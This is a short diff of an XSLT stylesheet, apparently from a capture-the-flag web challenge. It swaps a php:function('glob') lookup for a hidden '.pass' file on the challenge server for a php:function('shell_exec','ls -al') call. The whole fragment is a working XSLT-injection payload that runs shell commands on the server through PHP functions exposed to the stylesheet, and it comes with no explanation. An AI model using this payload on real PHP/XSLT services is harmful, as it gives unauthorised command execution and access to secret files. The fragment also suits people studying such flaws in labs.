@@ -3,7 +3,7 @@
 
 
    
-    <xsl:variable name="path" select="php:function('glob','/challenge/web-serveur/.pass*/')"/>
-<xsl:value-of select="php:function('print_r','$path')" />
+    
+<xsl:value-of select="php:function('shell_exec','ls -al')" />
     </xsl:template>
 </xsl:stylesheet>
